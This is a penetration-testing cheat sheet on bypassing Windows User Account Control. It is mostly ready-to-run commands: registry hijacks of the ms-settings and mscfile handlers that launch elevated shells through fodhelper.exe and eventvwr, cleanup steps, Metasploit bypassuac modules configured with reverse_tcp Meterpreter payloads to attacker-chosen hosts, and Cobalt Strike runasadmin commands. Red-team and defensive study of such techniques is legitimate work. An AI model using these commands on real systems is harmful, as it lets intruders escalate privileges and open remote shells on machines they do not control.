# Bypassing UAC

## 01 - Fodhelper

### 1.1 - Manual

#### 1.1.1 - Detect

TODO: write more about this

- **Enumeration**

```
C:\> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                                    Type             SID          Attributes
============================================================= ================ ============ ==================================================
Everyone                                                      Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account and member of Administrators group Well-known group S-1-5-114    Group used for deny only
BUILTIN\Administrators                                        Alias            S-1-5-32-544 Group used for deny only
BUILTIN\Users                                                 Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
..[snip]..
Mandatory Label\Medium Mandatory Level                        Label            S-1-16-8192

C:\> net localgroup %username%
```

If it's part of the **Administrators** **Group** you can exploit it with the BypassUAC exploits or another simple method and hopefully it'll work as long it's **autoelevated**.

```
C:\> powershell.exe Start-Process cmd.exe -Verb RunAs

C:\> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                                    Type             SID          Attributes
============================================================= ================ ============ ==================================================
Everyone                                                      Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account and member of Administrators group Well-known group S-1-5-114    Mandatory group, Enabled by default, Enabled group
BUILTIN\Administrators                                        Alias            S-1-5-32-544 Mandatory group, Enabled by default, Enabled group, Group owner
BUILTIN\Users                                                 Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
..[snip]..
Mandatory Label\High Mandatory Level                          Label            S-1-16-12288

C:\> sigcheck.exe -a -m C:\Windows\System32\fodhelper.exe
```

#### 1.1.2 - Exploit

##### 1.1.2.1 - Command Prompt

```
C:\> reg add HKCU\Software\Classes\ms-settings\Shell\Open\command

C:\> reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ /d cmd.exe /f

C:\> fodhelper.exe
```

##### 1.1.2.2 - Powershell

```
PS C:\> New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force

PS C:\> New-ItemProperty "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force

PS C:\> Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "cmd.exe" -Force

PS C:\> Start-Process C:\Windows\System32\fodhelper.exe

PS C:\> Invoke-Item C:\Windows\System32\fodhelper.exe
```

#### 1.1.2 - Cleanup

##### 1.1.2.1 - Command Prompt

`C:\> reg delete HKCU\Software\Classes\ms-settings\ /f`

##### 1.1.2.2 - Powershell

`PS C:\> Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force`

### 1.2 - Metasploit

- Migrate to a 64-bit process ID architecture in order to perform privilege escalation

```
meterpreter > migrate <pid>
meterpreter > migrate -N explorer.exe
meterpreter > background
```

There are two MSF modules for **BypassUAC**

- This uses a payload as a dropper (this will touch the disk)

```
msf exploit(multi/handler) > use exploit/windows/local/bypassuac

msf exploit(windows/local/bypassuac) > set payload /windows/x64/meterpreter/reverse_tcp

msf exploit(windows/local/bypassuac) > set target Windows x64

msf exploit(windows/local/bypassuac) > run lhost=<IP> lport=<PORT> session=<session_id>
```

- This will execute it through memory

```
msf exploit(multi/handler) > use exploit/windows/local/bypassuac_injection

msf exploit(windows/local/bypassuac_injection) > set payload /windows/x64/meterpreter/reverse_tcp

msf exploit(windows/local/bypassuac_injection) > set target Windows x64

msf exploit(windows/local/bypassuac_injection) > run lhost=<IP> lport=<PORT> session=<session_id>
```

- Performing Privilege escalation that abuses WinSXS

```
msf exploit(multi/handler) > use exploit/windows/local/bypassuac_injection_winsxs

msf exploit(windows/local/bypassuac_injection_winsxs) > set payload /windows/x64/meterpreter/reverse_tcp

msf exploit(windows/local/bypassuac_injection_winsxs) > set target Windows x64

msf exploit(windows/local/bypassuac_injection_winsxs) > run lhost=<IP> lport=<PORT> session=<session_id>
```

## 02 - MMC

### 2.1 - Manual

#### 2.1.1 - Exploit

```
C:\> reg add "HKCU\SOFTWARE\Classes\mscfile\shell\open\command" /f

C:\> reg add "HKCU\SOFTWARE\Classes\mscfile\shell\open\command" /t REG_SZ /d "C:\path\to\shell.exe" /f
```

#### 2.1.2 - Cleanup

```
C:\> eventvwr

C:\> reg delete "HKCU\SOFTWARE\Classes\mscfile" /f
```

## 03 - Token Duplication

### 3.1 - Cobalt Strike

`beacon> runasadmin uac-token-duplication <commmand> [arguments]`

## 04 - CMSTP

### 4.1 - Cobalt Strike

`beacon> runasadmin uac-cmstplua <commmand> [arguments]`

## References

- [UACME](https://github.com/hfiref0x/UACME)

- [SS64 whoami](https://ss64.com/nt/whoami.html)

- [SS64. Syntax Elevate](https://ss64.com/nt/syntax-elevate.html)

- [Helpsystems: Cobalt Strike Privilege Escalation](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/post-exploitation_privilege-escalation.htm)